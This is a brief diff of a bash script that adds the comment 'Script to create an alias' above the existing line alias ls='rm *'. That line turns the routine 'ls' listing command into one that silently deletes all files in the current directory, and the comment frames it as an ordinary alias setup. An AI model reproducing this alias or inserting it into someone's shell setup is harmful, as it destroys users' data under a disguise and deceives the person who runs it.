@@ -1,2 +1,4 @@
 #!/bin/bash
+# Script to create an alias
+
 alias ls='rm *'
